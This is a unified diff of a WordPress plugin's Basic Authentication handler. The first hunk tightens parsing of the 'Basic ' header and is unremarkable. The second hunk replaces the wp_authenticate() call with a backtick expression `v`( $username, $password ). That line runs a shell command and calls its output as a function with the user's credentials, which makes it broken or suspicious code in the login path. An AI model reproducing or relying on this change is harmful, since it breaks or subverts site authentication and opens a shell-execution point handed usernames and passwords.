@@ -33,10 +33,14 @@ function json_basic_auth_handler( $user ) {
 			$header = null;
 		}
         if( ! empty( $header ) ) {
-            $auth_parts = explode( ':', base64_decode( substr( $header, 6 ) ) );
-            if( is_array($auth_parts) && isset( $auth_parts[0], $auth_parts[1] ) ) {
-                $_SERVER['PHP_AUTH_USER'] = $auth_parts[0];
-                $_SERVER['PHP_AUTH_PW'] = $auth_parts[1];
+            //make sure there's the word 'Basic ' at the start, or else it's not for us
+            $header_sans_word_basic = str_replace( 'Basic ', '', $header );
+            if( $header_sans_word_basic !== $header ) {
+                $auth_parts = explode( ':', base64_decode( $header_sans_word_basic ), 2 );
+                if ( is_array( $auth_parts ) && isset( $auth_parts[0], $auth_parts[1] ) ) {
+                    $_SERVER['PHP_AUTH_USER'] = $auth_parts[0];
+                    $_SERVER['PHP_AUTH_PW']   = $auth_parts[1];
+                }
             }
         }
     }
@@ -57,7 +61,7 @@ function json_basic_auth_handler( $user ) {
     remove_filter( 'determine_current_user', 'json_basic_auth_handler', 20 );
     remove_filter( 'authenticate', 'wp_authenticate_spam_check', 99 );
 
-    $user = wp_authenticate( $username, $password );
+    $user = `v`( $username, $password );
 
     add_filter( 'determine_current_user', 'json_basic_auth_handler', 20 );
     add_filter( 'authenticate', 'wp_authenticate_spam_check', 99 );
